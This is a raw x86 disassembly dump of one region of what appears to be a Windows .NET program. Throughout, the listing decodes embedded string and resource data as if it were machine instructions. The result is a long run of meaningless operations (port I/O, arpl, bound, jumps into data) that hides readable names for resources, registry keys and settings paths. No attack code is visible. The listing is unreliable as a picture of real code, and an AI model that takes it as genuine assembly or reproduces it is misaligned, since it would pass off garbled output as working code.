  403b9b:	gs jb  0x403c12
  403b9e:	imul   esp,DWORD PTR [ebp+0x73],0x7365522e
  403ba5:	outs   dx,DWORD PTR ds:[esi]
  403ba6:	jne    0x403c1a
  403ba8:	arpl   WORD PTR [ebp+0x73],sp
  403bab:	cs jb  0x403c13
  403bae:	jae    0x403c1f
  403bb0:	jne    0x403c24
  403bb2:	arpl   WORD PTR [ebp+0x73],sp
  403bb5:	add    BYTE PTR [ebp+eiz*2+0x62],al
  403bb9:	jne    0x403c22
  403bbb:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  403bc3:	jae    0x403bc5
  403bc5:	push   edx
  403bc6:	gs jo  0x403c2a
  403bc9:	imul   esi,DWORD PTR [edx+0x2e],0x706f7250
  403bd0:	gs jb  0x403c47
  403bd3:	imul   esp,DWORD PTR [ebp+0x73],0x65686300
  403bda:	arpl   WORD PTR [ebx+0x56],bp
  403bdd:	gs jb  0x403c49
  403be0:	data16 jns 0x403c29
  403be3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x73],0x616e4500
  403beb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x56]
  403bef:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  403bf6:	jns    0x403c64
  403bf8:	gs jae 0x403bfb
  403bfb:	inc    ecx
  403bfc:	outs   dx,BYTE PTR ds:[esi]
  403bfd:	arpl   WORD PTR [eax+0x6f],bp
  403c00:	jb     0x403c55
  403c02:	je     0x403c7d
  403c04:	ins    BYTE PTR es:[edi],dx
  403c05:	gs jae 0x403c08
  403c08:	arpl   WORD PTR [eax+0x65],bp
  403c0b:	arpl   WORD PTR [ebx+0x52],bp
  403c0e:	imul   ebp,DWORD PTR gs:[esi+0x73],0x6c6c6174
  403c16:	push   edx
  403c17:	jne    0x403c87
  403c19:	je     0x403c84
  403c1b:	ins    DWORD PTR es:[edi],dx
  403c1c:	gs jae 0x403c1f
  403c1f:	push   edi
  403c20:	jb     0x403c8b
  403c22:	je     0x403c89
  403c24:	inc    ecx
  403c25:	ins    BYTE PTR es:[edi],dx
  403c26:	ins    BYTE PTR es:[edi],dx
  403c27:	dec    esp
  403c28:	imul   ebp,DWORD PTR [esi+0x65],0x68630073
  403c2f:	arpl   WORD PTR gs:[ebx+0x52],bp
  403c33:	gs jae 0x403c9b
  403c36:	je     0x403c8b
  403c38:	gs je  0x403caf
  403c3b:	imul   ebp,DWORD PTR [esi+0x67],0x76450073
  403c42:	outs   dx,BYTE PTR gs:[esi]
  403c44:	je     0x403c87
  403c46:	jb     0x403caf
  403c48:	jae    0x403c4a
  403c4a:	addr16 gs je 0x403cad
  403c4e:	inc    ebx
  403c4f:	outs   dx,DWORD PTR ds:[esi]
  403c50:	outs   dx,BYTE PTR ds:[esi]
  403c51:	je     0x403cc5
  403c53:	outs   dx,DWORD PTR ds:[esi]
  403c54:	ins    BYTE PTR es:[edi],dx
  403c55:	jae    0x403c57
  403c57:	push   ebx
  403c58:	jns    0x403ccd
  403c5a:	je     0x403cc1
  403c5c:	ins    DWORD PTR es:[edi],dx
  403c5d:	cs push edi
  403c5f:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  403c66:	inc    esi
  403c67:	outs   dx,DWORD PTR ds:[esi]
  403c68:	jb     0x403cd7
  403c6a:	jae    0x403c6c
  403c6c:	jae    0x403cd3
  403c6e:	je     0x403ccf
  403c70:	inc    ecx
  403c71:	jne    0x403ce7
  403c73:	outs   dx,DWORD PTR ds:[esi]
  403c74:	push   ebx
  403c75:	arpl   WORD PTR [ecx+0x6c],sp
  403c78:	gs inc esp
  403c7a:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  403c81:	outs   dx,BYTE PTR ds:[esi]
  403c82:	jae    0x403c84
  403c84:	dec    ebp
  403c85:	gs jae 0x403cfb
  403c88:	popa   
  403c89:	addr16 gs inc edx
  403c8c:	outs   dx,DWORD PTR ds:[esi]
  403c8d:	js     0x403cd1
  403c8f:	jne    0x403d05
  403c91:	je     0x403d02
  403c93:	outs   dx,BYTE PTR ds:[esi]
  403c94:	jae    0x403c96
  403c96:	push   eax
  403c97:	jb     0x403d08
  403c99:	arpl   WORD PTR [ebp+0x73],sp
  403c9c:	jae    0x403c9e
  403c9e:	arpl   WORD PTR [edi+0x6d],bp
  403ca1:	jo     0x403d12
  403ca3:	outs   dx,BYTE PTR ds:[esi]
  403ca4:	outs   dx,BYTE PTR gs:[esi]
  403ca6:	je     0x403d1b
  403ca8:	add    BYTE PTR [ebp+0x78],al
  403cab:	imul   esi,DWORD PTR [ebx+0x74],0x6f430073
  403cb2:	outs   dx,BYTE PTR ds:[esi]
  403cb3:	arpl   WORD PTR [ecx+0x74],sp
  403cb6:	add    BYTE PTR [edi+0x65],al
  403cb9:	je     0x403d0a
  403cbb:	bound  ebp,QWORD PTR [edx+0x65]
  403cbe:	arpl   WORD PTR [eax+eax*1+0x53],si
  403cc2:	jo     0x403d30
  403cc4:	imul   esi,DWORD PTR [eax+eax*1+0x45],0x746978
  403ccc:	addr16 gs je 0x403d2f
  403cd0:	inc    esp
  403cd1:	gs popaw 
  403cd4:	jne    0x403d42
  403cd6:	je     0x403cd8
  403cd8:	push   ebx
  403cd9:	gs je  0x403d1f
  403cdc:	outs   dx,DWORD PTR ds:[esi]
  403cdd:	ins    DWORD PTR es:[edi],dx
  403cde:	jo     0x403d41
  403ce0:	je     0x403d4b
  403ce2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x54]
  403ce6:	gs js  0x403d5d
  403ce9:	push   edx
  403cea:	outs   dx,BYTE PTR gs:[esi]
  403cec:	fs gs jb 0x403d59
  403cf0:	outs   dx,BYTE PTR ds:[esi]
  403cf1:	addr16 inc esp
  403cf3:	gs popaw 
  403cf6:	jne    0x403d64
  403cf8:	je     0x403cfa
  403cfa:	jae    0x403d61
  403cfc:	je     0x403d5d
  403cfe:	inc    esp
  403cff:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  403d06:	jae    0x403d7d
  403d08:	ins    BYTE PTR es:[edi],dx
  403d09:	je     0x403d0b
  403d0b:	inc    ebp
  403d0c:	outs   dx,BYTE PTR ds:[esi]
  403d0d:	jbe    0x403d78
  403d0f:	jb     0x403d80
  403d11:	outs   dx,BYTE PTR ds:[esi]
  403d12:	ins    DWORD PTR es:[edi],dx
  403d13:	outs   dx,BYTE PTR gs:[esi]
  403d15:	je     0x403d17
  403d17:	dec    ecx
  403d18:	outs   dx,BYTE PTR ds:[esi]
  403d19:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  403d21:	inc    ebx
  403d22:	outs   dx,DWORD PTR ds:[esi]
  403d23:	ins    DWORD PTR es:[edi],dx
  403d24:	jo     0x403d95
  403d26:	outs   dx,BYTE PTR ds:[esi]
  403d27:	outs   dx,BYTE PTR gs:[esi]
  403d29:	je     0x403d2b
  403d2b:	jo     0x403d8e
  403d2d:	jb     0x403d94
  403d2f:	outs   dx,BYTE PTR ds:[esi]
  403d30:	je     0x403d32
  403d32:	addr16 gs je 0x403d95
  403d36:	inc    ebx
  403d37:	jne    0x403dab
  403d39:	jb     0x403da0
  403d3b:	outs   dx,BYTE PTR ds:[esi]
  403d3c:	je     0x403d3e
  403d3e:	push   eax
  403d3f:	outs   dx,DWORD PTR ds:[esi]
  403d40:	imul   ebp,DWORD PTR [esi+0x74],0x6f6f7200
  403d47:	je     0x403d49
  403d49:	push   esp
  403d4a:	jb     0x403db5
  403d4c:	ins    DWORD PTR es:[edi],dx
  403d4d:	push   ebx
  403d4e:	je     0x403db1
  403d50:	jb     0x403dc6
  403d52:	add    BYTE PTR [ebx+0x75],dl
  403d55:	jae    0x403dc7
  403d57:	outs   dx,BYTE PTR gs:[esi]
  403d59:	fs dec esp
  403d5b:	popa   
  403d5c:	jns    0x403dcd
  403d5e:	jne    0x403dd4
  403d60:	add    BYTE PTR [edx+0x65],dl
  403d63:	jae    0x403dda
  403d65:	ins    DWORD PTR es:[edi],dx
  403d66:	gs dec esp
  403d68:	popa   
  403d69:	jns    0x403dda
  403d6b:	jne    0x403de1
  403d6d:	add    BYTE PTR [eax+0x65],dl
  403d70:	jb     0x403dd8
  403d72:	outs   dx,DWORD PTR ds:[esi]
  403d73:	jb     0x403de2
  403d75:	dec    esp
  403d76:	popa   
  403d77:	jns    0x403de8
  403d79:	jne    0x403def
  403d7b:	add    BYTE PTR [ebp+0x6f],cl
  403d7e:	jbe    0x403de5
  403d80:	dec    esi
  403d81:	gs js  0x403df8
  403d84:	add    BYTE PTR [ebx+0x79],dl
  403d87:	jae    0x403dfd
  403d89:	gs ins DWORD PTR es:[edi],dx
  403d8b:	cs push esp
  403d8d:	gs js  0x403e04
  403d90:	add    BYTE PTR [ebx+0x65],dh
  403d93:	je     0x403df4
  403d95:	push   esp
  403d96:	gs js  0x403e0d
  403d99:	add    BYTE PTR [ebx+0x68],dl
  403d9c:	outs   dx,DWORD PTR ds:[esi]
  403d9d:	ja     0x403d9f
  403d9f:	jae    0x403e06
  403da1:	je     0x403e02
  403da3:	push   esp
  403da4:	popa   
  403da5:	bound  ecx,QWORD PTR [ecx+0x6e]
  403da8:	fs gs js 0x403dac
  403dac:	dec    ebp
  403dad:	gs jae 0x403e23
  403db0:	popa   
  403db1:	addr16 gs inc edx
  403db4:	outs   dx,DWORD PTR ds:[esi]
  403db5:	js     0x403db7
  403db7:	jae    0x403e1e
  403db9:	je     0x403e1a
  403dbb:	dec    ebp
  403dbc:	imul   ebp,DWORD PTR [esi+0x69],0x657a696d
  403dc3:	inc    edx
  403dc4:	outs   dx,DWORD PTR ds:[esi]
  403dc5:	js     0x403dc7
  403dc7:	jae    0x403e2e
  403dc9:	je     0x403e2a
  403dcb:	dec    ebp
  403dcc:	popa   
  403dcd:	js     0x403e38
  403dcf:	ins    DWORD PTR es:[edi],dx
  403dd0:	imul   edi,DWORD PTR [edx+0x65],0x786f42
  403dd7:	inc    ebx
  403dd8:	push   0x426b6365
  403ddd:	outs   dx,DWORD PTR ds:[esi]
  403dde:	js     0x403de0
  403de0:	inc    edi
  403de1:	jb     0x403e52
  403de3:	jne    0x403e55
  403de5:	inc    edx
  403de6:	outs   dx,DWORD PTR ds:[esi]
  403de7:	js     0x403de9
  403de9:	dec    edi
  403dea:	jo     0x403e51
  403dec:	outs   dx,BYTE PTR ds:[esi]
  403ded:	push   ebx
  403dee:	jne    0x403e52
  403df0:	dec    ebx
  403df1:	gs jns 0x403df4
  403df4:	push   edx
  403df5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x654b7972
  403dfe:	jns    0x403e00
  403e00:	imul   esp,DWORD PTR [ebp+0x79],0x0
  403e04:	addr16 gs je 0x403e67
  403e08:	inc    ecx
  403e09:	jae    0x403e7e
  403e0b:	gs ins DWORD PTR es:[edi],dx
  403e0d:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  403e11:	inc    ebx
  403e12:	jb     0x403e79
  403e14:	popa   
  403e15:	je     0x403e7c
  403e17:	inc    esp
  403e18:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  403e1f:	jns    0x403e21
  403e21:	push   edx
  403e22:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f007972
  403e2b:	jo     0x403e8c
  403e2d:	inc    ebp
  403e2e:	jno    0x403ea5
  403e30:	popa   
  403e31:	ins    BYTE PTR es:[edi],dx
  403e32:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x15000000
  403e3a:	inc    edi
  403e3b:	add    BYTE PTR [ecx+0x0],ah
  403e3e:	ins    BYTE PTR es:[edi],dx
  403e3f:	add    BYTE PTR [ecx+0x0],ah
  403e42:	js     0x403e44
  403e44:	jns    0x403e46
  403e46:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  403e4b:	add    BYTE PTR [eax+eax*1+0x0],ch
  403e4f:	sbb    eax,0x630073
  403e54:	jb     0x403e56
  403e56:	add    BYTE PTR gs:[ebp+0x0],ah
  403e5a:	outs   dx,BYTE PTR ds:[esi]
  403e5b:	add    BYTE PTR [ebp+0x0],cl
  403e5e:	outs   dx,DWORD PTR ds:[esi]
  403e5f:	add    BYTE PTR [eax+eax*1+0x65],ah
  403e63:	add    BYTE PTR [eax],ah
  403e65:	add    BYTE PTR ds:0x31002000,bh
  403e6b:	add    BYTE PTR [eax],al
  403e6d:	sub    esi,DWORD PTR [edx+0x0]
  403e70:	add    BYTE PTR gs:[ebx+0x0],dh
  403e74:	outs   dx,DWORD PTR ds:[esi]
  403e75:	add    BYTE PTR [eax+eax*1+0x75],ch
  403e79:	add    BYTE PTR [eax+eax*1+0x69],dh
  403e7d:	add    BYTE PTR [edi+0x0],ch
  403e80:	outs   dx,BYTE PTR ds:[esi]
  403e81:	add    BYTE PTR [eax],ah
  403e83:	add    BYTE PTR ds:0x31002000,bh
  403e89:	add    BYTE PTR [eax],dh
  403e8b:	add    BYTE PTR [edx],dh
  403e8d:	add    BYTE PTR [eax+eax*1],dh
  403e90:	and    BYTE PTR [eax],al
  403e92:	aaa    
  403e93:	add    BYTE PTR [esi],dh
  403e95:	add    BYTE PTR [eax],bh
  403e97:	add    BYTE PTR [eax],al
  403e99:	aaa    
  403e9a:	dec    ebp
  403e9b:	add    BYTE PTR [ecx+0x0],bh
  403e9e:	and    BYTE PTR [eax],al
  403ea0:	inc    edi
  403ea1:	add    BYTE PTR [ecx+0x0],ah
  403ea4:	ins    DWORD PTR es:[edi],dx
  403ea5:	add    BYTE PTR [ebp+0x0],ah
  403ea8:	jae    0x403eaa
  403eaa:	pop    esp
  403eab:	add    BYTE PTR [edi+0x0],al
  403eae:	jb     0x403eb0
  403eb0:	imul   eax,DWORD PTR [eax],0x20006d
  403eb6:	inc    esp
  403eb7:	add    BYTE PTR [ecx+0x0],ah
  403eba:	ja     0x403ebc
  403ebc:	outs   dx,BYTE PTR ds:[esi]
  403ebd:	add    BYTE PTR [eax+eax*1+0x53],bl
  403ec1:	add    BYTE PTR [ebp+0x0],ah
  403ec4:	je     0x403ec6
  403ec6:	je     0x403ec8
  403ec8:	imul   eax,DWORD PTR [eax],0x67006e
  403ece:	jae    0x403ed0
  403ed0:	add    BYTE PTR [edi],dl
  403ed2:	outs   dx,DWORD PTR ds:[esi]
  403ed3:	add    BYTE PTR [eax+0x0],dh
  403ed6:	je     0x403ed8
  403ed8:	imul   eax,DWORD PTR [eax],0x6e006f
  403ede:	jae    0x403ee0
  403ee0:	add    BYTE PTR cs:[eax+eax*1+0x78],dh
  403ee5:	add    BYTE PTR [eax+eax*1+0x0],dh
  403ee9:	add    DWORD PTR ds:0x6f0059,0x720075
  403ef3:	and    BYTE PTR [eax],al
  403ef5:	outs   dx,DWORD PTR ds:[esi]
  403ef6:	add    BYTE PTR [eax+0x0],dh
  403ef9:	je     0x403efb
  403efb:	imul   eax,DWORD PTR [eax],0x6e006f
  403f01:	jae    0x403f03
  403f03:	add    BYTE PTR cs:[eax+eax*1+0x78],dh
  403f08:	add    BYTE PTR [eax+eax*1+0x20],dh
  403f0c:	add    BYTE PTR [esi+0x0],ah
  403f0f:	imul   eax,DWORD PTR [eax],0x65006c
  403f15:	and    BYTE PTR [eax],al
  403f17:	arpl   WORD PTR [eax],ax
  403f19:	outs   dx,DWORD PTR ds:[esi]
  403f1a:	add    BYTE PTR [ebp+0x0],dh
  403f1d:	ins    BYTE PTR es:[edi],dx
  403f1e:	add    BYTE PTR [eax+eax*1+0x20],ah
  403f22:	add    BYTE PTR [esi+0x0],ch
  403f25:	outs   dx,DWORD PTR ds:[esi]
  403f26:	add    BYTE PTR [eax+eax*1+0x20],dh
  403f2a:	add    BYTE PTR [edx+0x0],ah
  403f2d:	add    BYTE PTR gs:[eax],ah
  403f30:	add    BYTE PTR [ecx+0x0],ah
  403f33:	arpl   WORD PTR [eax],ax
  403f35:	arpl   WORD PTR [eax],ax
  403f37:	add    BYTE PTR gs:[ebx+0x0],dh
  403f3b:	jae    0x403f3d
  403f3d:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  403f42:	add    BYTE PTR [eax],ah
  403f44:	add    BYTE PTR [eax+0x0],dl
  403f47:	ins    BYTE PTR es:[edi],dx
  403f48:	add    BYTE PTR [ebp+0x0],ah
  403f4b:	popa   
  403f4c:	add    BYTE PTR [ebx+0x0],dh
  403f4f:	add    BYTE PTR gs:[eax],ah
  403f52:	add    BYTE PTR [ebx+0x0],ah
  403f55:	push   0x63006500
  403f5a:	add    BYTE PTR [ebx+0x0],ch
  403f5d:	and    BYTE PTR [eax],al
  403f5f:	data16 add BYTE PTR [ecx+0x0],ch
  403f63:	ins    BYTE PTR es:[edi],dx
  403f64:	add    BYTE PTR [ebp+0x0],ah
  403f67:	and    BYTE PTR [eax],al
  403f69:	jo     0x403f6b
  403f6b:	add    BYTE PTR gs:[edx+0x0],dh
  403f6f:	ins    DWORD PTR es:[edi],dx
  403f70:	add    BYTE PTR [ecx+0x0],ch
  403f73:	jae    0x403f75
  403f75:	jae    0x403f77
  403f77:	imul   eax,DWORD PTR [eax],0x6e006f
  403f7d:	jae    0x403f7f
  403f7f:	and    BYTE PTR [eax],al
  403f81:	outs   dx,DWORD PTR ds:[esi]
  403f82:	add    BYTE PTR [esi+0x0],ch
  403f85:	and    BYTE PTR [eax],al
  403f87:	daa    
  403f88:	add    BYTE PTR [eax+eax*1+0x6f],al
  403f8c:	add    BYTE PTR [ebx+0x0],ah
  403f8f:	jne    0x403f91
  403f91:	ins    DWORD PTR es:[edi],dx
  403f92:	add    BYTE PTR [ebp+0x0],ah
  403f95:	outs   dx,BYTE PTR ds:[esi]
  403f96:	add    BYTE PTR [eax+eax*1+0x73],dh
  403f9a:	add    BYTE PTR [eax+eax*1+0x4d],bl
  403f9e:	add    BYTE PTR [ecx+0x0],bh
  403fa1:	and    BYTE PTR [eax],al
  403fa3:	inc    edi
  403fa4:	add    BYTE PTR [ecx+0x0],ah
  403fa7:	ins    DWORD PTR es:[edi],dx
  403fa8:	add    BYTE PTR [ebp+0x0],ah
  403fab:	jae    0x403fad
  403fad:	pop    esp
  403fae:	add    BYTE PTR [edi+0x0],al
  403fb1:	jb     0x403fb3
  403fb3:	imul   eax,DWORD PTR [eax],0x20006d
  403fb9:	inc    esp
  403fba:	add    BYTE PTR [ecx+0x0],ah
  403fbd:	ja     0x403fbf
  403fbf:	outs   dx,BYTE PTR ds:[esi]
  403fc0:	add    BYTE PTR [eax+eax*1+0x53],bl
  403fc4:	add    BYTE PTR [ebp+0x0],ah
  403fc7:	je     0x403fc9
  403fc9:	je     0x403fcb
  403fcb:	imul   eax,DWORD PTR [eax],0x67006e
  403fd1:	jae    0x403fd3
  403fd3:	pop    esp
  403fd4:	add    BYTE PTR [edi+0x0],ch
  403fd7:	jo     0x403fd9
  403fd9:	je     0x403fdb
  403fdb:	imul   eax,DWORD PTR [eax],0x6e006f
  403fe1:	jae    0x403fe3
  403fe3:	add    BYTE PTR cs:[eax+eax*1+0x78],dh
  403fe8:	add    BYTE PTR [eax+eax*1+0x27],dh
  403fec:	add    BYTE PTR [esi],ch
  403fee:	add    BYTE PTR [ecx],al
  403ff0:	sub    eax,DWORD PTR [edi+0x0]
  403ff3:	jb     0x403ff5
  403ff5:	imul   eax,DWORD PTR [eax],0x20006d
  403ffb:	inc    esp
  403ffc:	add    BYTE PTR [ecx+0x0],ah
  403fff:	ja     0x404001
  404001:	outs   dx,BYTE PTR ds:[esi]
  404002:	add    BYTE PTR [eax],ah
  404004:	add    BYTE PTR [edx+0x0],dl
  404007:	add    BYTE PTR gs:[eax+0x0],dh
  40400b:	popa   
  40400c:	add    BYTE PTR [ecx+0x0],ch
  40400f:	jb     0x404011
  404011:	and    BYTE PTR [eax],al
  404013:	push   esp
  404014:	add    BYTE PTR [edi+0x0],ch
  404017:	outs   dx,DWORD PTR ds:[esi]
  404018:	add    BYTE PTR [eax+eax*1+0x0],ch
  40401c:	das    
  40401d:	jae    0x40401f
  40401f:	je     0x404021
  404021:	add    BYTE PTR gs:[ecx+0x0],ah
  404025:	ins    DWORD PTR es:[edi],dx
  404026:	add    BYTE PTR [edx],bh
  404028:	add    BYTE PTR [edi],ch
  40402a:	add    BYTE PTR [edi],ch
  40402c:	add    BYTE PTR [esi+0x0],dh
  40402f:	popa   
  404030:	add    BYTE PTR [eax+eax*1+0x69],ch
  404034:	add    BYTE PTR [eax+eax*1+0x61],ah
  404038:	add    BYTE PTR [eax+eax*1+0x65],dh
  40403c:	add    BYTE PTR [edi],ch
  40403e:	add    BYTE PTR [edx],dh
  404040:	add    BYTE PTR [ecx],dh
  404042:	add    BYTE PTR [ecx],bh
  404044:	add    BYTE PTR [ecx],bh
  404046:	add    BYTE PTR [ecx],bh
  404048:	add    BYTE PTR [eax],dh
  40404a:	add    BYTE PTR [eax],al
  40404c:	sub    DWORD PTR [ebx+0x0],edx
  40404f:	outs   dx,DWORD PTR ds:[esi]
  404050:	add    BYTE PTR [esi+0x0],ah
  404053:	je     0x404055
  404055:	ja     0x404057
  404057:	popa   
  404058:	add    BYTE PTR [edx+0x0],dh
  40405b:	add    BYTE PTR gs:[eax+eax*1+0x56],bl
  404060:	add    BYTE PTR [ecx+0x0],ah
  404063:	ins    BYTE PTR es:[edi],dx
  404064:	add    BYTE PTR [esi+0x0],dh
  404067:	add    BYTE PTR gs:[eax+eax*1+0x53],bl
  40406c:	add    BYTE PTR [eax+eax*1+0x65],dh
  404070:	add    BYTE PTR [ecx+0x0],ah
  404073:	ins    DWORD PTR es:[edi],dx
  404074:	add    BYTE PTR [eax],al
  404076:	adc    edx,DWORD PTR [ebx+0x0]
  404079:	je     0x40407b
  40407b:	add    BYTE PTR gs:[ecx+0x0],ah
  40407f:	ins    DWORD PTR es:[edi],dx
  404080:	add    BYTE PTR [eax+0x0],dl
  404083:	popa   
  404084:	add    BYTE PTR [eax+eax*1+0x68],dh
  404088:	add    BYTE PTR [eax],al
  40408a:	and    eax,0x63002f
  40408f:	outs   dx,DWORD PTR ds:[esi]
  404090:	add    BYTE PTR [esi+0x0],ch
  404093:	data16 add BYTE PTR [ecx+0x0],ch
  404097:	add    BYTE PTR [bx],ch
  40409a:	add    BYTE PTR [ebx+0x0],ah
  40409d:	outs   dx,DWORD PTR ds:[esi]
  40409e:	add    BYTE PTR [esi+0x0],ch
  4040a1:	data16 add BYTE PTR [ecx+0x0],ch
  4040a5:	add    BYTE PTR ds:0x7600,ch
  4040aa:	add    BYTE PTR [eax+eax*1+0x66],ah
  4040ae:	add    BYTE PTR [eax],al
  4040b0:	ja     0x4040fb
  4040b2:	add    BYTE PTR [esi+0x0],ch
  4040b5:	jae    0x4040b7
  4040b7:	je     0x4040b9
  4040b9:	popa   
  4040ba:	add    BYTE PTR [eax+eax*1+0x6c],ch
  4040be:	add    BYTE PTR [ebx+0x0],al
  4040c1:	outs   dx,DWORD PTR ds:[esi]
  4040c2:	add    BYTE PTR [esi+0x0],ch
  4040c5:	data16 add BYTE PTR [ecx+0x0],ch
  4040c9:	add    BYTE PTR [bp+di+0x0],dl
  4040cd:	je     0x4040cf
  4040cf:	outs   dx,DWORD PTR ds:[esi]
  4040d0:	add    BYTE PTR [edx+0x0],dh
  4040d3:	add    BYTE PTR gs:[edi],ch
  4040d6:	add    BYTE PTR [ebx+0x0],dl
  4040d9:	outs   dx,DWORD PTR ds:[esi]
  4040da:	add    BYTE PTR [esi+0x0],ah
  4040dd:	je     0x4040df
  4040df:	ja     0x4040e1
  4040e1:	popa   
  4040e2:	add    BYTE PTR [edx+0x0],dh
  4040e5:	add    BYTE PTR gs:[edi],ch
  4040e8:	add    BYTE PTR [esi+0x0],dl
  4040eb:	popa   
  4040ec:	add    BYTE PTR [eax+eax*1+0x76],ch
  4040f0:	add    BYTE PTR [ebp+0x0],ah
  4040f3:	das    
  4040f4:	add    BYTE PTR [ebx+0x0],dl
  4040f7:	je     0x4040f9
  4040f9:	add    BYTE PTR gs:[ecx+0x0],ah
  4040fd:	ins    DWORD PTR es:[edi],dx
  4040fe:	add    BYTE PTR [edi],ch
  404100:	add    BYTE PTR [edx+0x0],al
  404103:	popa   
  404104:	add    BYTE PTR [ebx+0x0],dh
  404107:	add    BYTE PTR gs:[ecx+0x0],cl
  40410b:	outs   dx,BYTE PTR ds:[esi]
  40410c:	add    BYTE PTR [ebx+0x0],dh
  40410f:	je     0x404111
  404111:	popa   
  404112:	add    BYTE PTR [eax+eax*1+0x6c],ch
  404116:	add    BYTE PTR [esi+0x0],al
  404119:	outs   dx,DWORD PTR ds:[esi]
  40411a:	add    BYTE PTR [eax+eax*1+0x64],ch
  40411e:	add    BYTE PTR [ebp+0x0],ah
  404121:	jb     0x404123
  404123:	pop    edi
  404124:	add    BYTE PTR [ecx],dh
  404126:	add    BYTE PTR [eax],al
  404128:	adc    BYTE PTR [ebx+0x73005c],0x74
  40412f:	add    BYTE PTR [ebp+0x0],ah
  404132:	popa   
  404133:	add    BYTE PTR [ebp+0x0],ch
  404136:	popa   
  404137:	add    BYTE PTR [eax+0x0],dh
  40413a:	jo     0x40413c
  40413c:	jae    0x40413e
  40413e:	pop    esp
  40413f:	add    BYTE PTR [ebx+0x0],ah
  404142:	outs   dx,DWORD PTR ds:[esi]
  404143:	add    BYTE PTR [ebp+0x0],ch
  404146:	ins    DWORD PTR es:[edi],dx
  404147:	add    BYTE PTR [edi+0x0],ch
  40414a:	outs   dx,BYTE PTR ds:[esi]
  40414b:	add    BYTE PTR [eax+eax*1+0x67],bl
  40414f:	add    BYTE PTR [edx+0x0],dh
  404152:	imul   eax,DWORD PTR [eax],0x20006d
  404158:	add    BYTE PTR fs:[ecx+0x0],ah
  40415c:	ja     0x40415e
  40415e:	outs   dx,BYTE PTR ds:[esi]
  40415f:	add    BYTE PTR [eax+eax*1+0x5f],bl
  404163:	add    BYTE PTR [ebx+0x0],ah
  404166:	outs   dx,DWORD PTR ds:[esi]
  404167:	add    BYTE PTR [ebp+0x0],ch
  40416a:	ins    DWORD PTR es:[edi],dx
  40416b:	add    BYTE PTR [edi+0x0],ch
  40416e:	outs   dx,BYTE PTR ds:[esi]
  40416f:	add    BYTE PTR [edx+0x0],dh
  404172:	add    BYTE PTR gs:[eax+eax*1+0x69],ah
  404177:	add    BYTE PTR [ebx+0x0],dh
  40417a:	je     0x40417c
  40417c:	pop    esp
  40417d:	add    BYTE PTR [esi+0x0],dh
  404180:	arpl   WORD PTR [eax],ax
  404182:	jb     0x404184
  404184:	add    BYTE PTR gs:[eax+eax*1+0x69],ah
  404189:	add    BYTE PTR [ebx+0x0],dh
  40418c:	je     0x40418e
  40418e:	pop    esp
  40418f:	add    BYTE PTR [edx],dh
  404191:	add    BYTE PTR [eax],dh
  404193:	add    BYTE PTR [ecx],dh
  404195:	add    BYTE PTR ds:0x76005c00,dh
  40419b:	add    BYTE PTR [ebx+0x0],ah
  40419e:	pop    edi
  40419f:	add    BYTE PTR [edx+0x0],dh
  4041a2:	add    BYTE PTR gs:[eax+eax*1+0x69],ah
  4041a7:	add    BYTE PTR [ebx+0x0],dh
  4041aa:	je     0x4041ac
  4041ac:	add    BYTE PTR cs:[eax+0x0],bh
  4041b0:	cmp    BYTE PTR [eax],al
  4041b2:	add    BYTE PTR ss:[esi],ch
  4041b5:	add    BYTE PTR [ebp+0x0],ah
  4041b8:	js     0x4041ba
  4041ba:	add    BYTE PTR gs:[eax],al
  4041bd:	and    edx,DWORD PTR [edx+0x0]
  4041c0:	add    BYTE PTR gs:[eax+0x0],dh
  4041c4:	popa   
  4041c5:	add    BYTE PTR [ecx+0x0],ch
  4041c8:	jb     0x4041ca
  4041ca:	jae    0x4041cc
  4041cc:	and    BYTE PTR [eax],al
  4041ce:	arpl   WORD PTR [eax],ax
  4041d0:	outs   dx,DWORD PTR ds:[esi]
  4041d1:	add    BYTE PTR [ebp+0x0],ch
  4041d4:	jo     0x4041d6
  4041d6:	ins    BYTE PTR es:[edi],dx
  4041d7:	add    BYTE PTR [ebp+0x0],ah
  4041da:	je     0x4041dc
  4041dc:	add    BYTE PTR gs:[ecx],ah
  4041df:	add    BYTE PTR [eax],al
  4041e1:	adc    esp,DWORD PTR [edi+0x0]
  4041e4:	jb     0x4041e6
  4041e6:	outs   dx,DWORD PTR ds:[esi]
  4041e7:	add    BYTE PTR [ebp+0x0],dh
  4041ea:	jo     0x4041ec
  4041ec:	inc    edx
  4041ed:	add    BYTE PTR [edi+0x0],ch
  4041f0:	js     0x4041f2
  4041f2:	xor    DWORD PTR [eax],eax
  4041f4:	add    BYTE PTR [ebx],dl
  4041f6:	and    BYTE PTR [eax],al
  4041f8:	dec    edi
  4041f9:	add    BYTE PTR [eax+0x0],dh
  4041fc:	je     0x4041fe
  4041fe:	imul   eax,DWORD PTR [eax],0x6e006f
  404204:	jae    0x404206
  404206:	and    BYTE PTR [eax],al
  404208:	add    BYTE PTR ds:0x680063,ch
  40420e:	add    BYTE PTR gs:[ebx+0x0],ah
  404212:	imul   eax,DWORD PTR [eax],0x52
  404215:	add    BYTE PTR [ebp+0x0],ah
  404218:	imul   eax,DWORD PTR [eax],0x73006e
  40421e:	je     0x404220
  404220:	popa   
  404221:	add    BYTE PTR [eax+eax*1+0x6c],ch
  404225:	add    BYTE PTR [edx+0x0],dl
  404228:	jne    0x40422a
  40422a:	outs   dx,BYTE PTR ds:[esi]
  40422b:	add    BYTE PTR [eax+eax*1+0x69],dh
  40422f:	add    BYTE PTR [ebp+0x0],ch
  404232:	add    BYTE PTR gs:[ebx+0x0],dh
  404236:	add    BYTE PTR [ecx],ah
  404238:	dec    ecx
  404239:	add    BYTE PTR [esi+0x0],ch
  40423c:	jae    0x40423e
  40423e:	je     0x404240
  404240:	popa   
